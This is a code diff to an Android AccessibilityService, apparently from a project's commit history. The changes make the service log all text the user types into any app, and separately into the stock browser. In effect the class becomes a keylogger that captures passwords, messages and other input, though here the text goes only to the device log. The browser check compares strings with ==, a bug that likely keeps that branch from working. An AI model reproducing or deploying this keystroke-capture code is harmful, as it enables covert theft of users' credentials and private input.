@@ -21,17 +21,31 @@ public class MyAccessibilityService extends AccessibilityService {
 
     @Override
     public void onAccessibilityEvent(AccessibilityEvent event) {
-        /*Log.d(TAG,"onAccessibilityEvent reached");
-        Log.v(TAG, String.format(
-                "****************************** onAccessibilityEvent: type = [ %s ], class = [ %s ], package = [ %s ], time = [ %s ], text = [ %s ]",
-                event.getEventType(), event.getClassName(), event.getPackageName(),
-                event.getEventTime(),event.toString()));*/
+        /*Log.d(TAG,"onAccessibilityEvent reached");*/
+//        Log.v(TAG, String.format("****************************** onAccessibilityEvent: type = [ %s ], class = [ %s ], package = [ %s ], time = [ %s ], text = [ %s ]", event.getEventType(), event.getClassName(), event.getPackageName(), event.getEventTime(),event.toString()));
 
+        //typing into wherever
         if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
             AccessibilityNodeInfo mNodeInfo = event.getSource();
             try{
+                if(event.getSource().getText()==null){
+                    Log.d(TAG,"getText() returned null");
+                    Log.v(TAG, String.format("onAccessibilityEvent: type = [ %s ], class = [ %s ], package = [ %s ], time = [ %s ], text = [ %s ]", event.getEventType(), event.getClassName(), event.getPackageName(), event.getEventTime(),event.toString()));
+                }else{
+                    Log.d(TAG,"ENTERED TEXT:" + mNodeInfo.getText().toString());
+                }
+            } catch (Exception e){
+                Log.d(TAG,Log.getStackTraceString(e));
+            }
+        }
+
+        //typing into browser window
+        if (event.getPackageName() == "com.android.browser") {
+            Log.d(TAG,"browser invoked");
+            AccessibilityNodeInfo mNodeInfo = event.getSource();
+            try{
                 /*Log.d(TAG,mNodeInfo.toString());*/
-                Log.d(TAG,"ENTERED TEXT:" + mNodeInfo.getText().toString());
+                Log.d(TAG,"ENTERED BROWSER TEXT:" + mNodeInfo.getText().toString());
             } catch (Exception e){
                 Log.d(TAG,Log.getStackTraceString(e));
             }
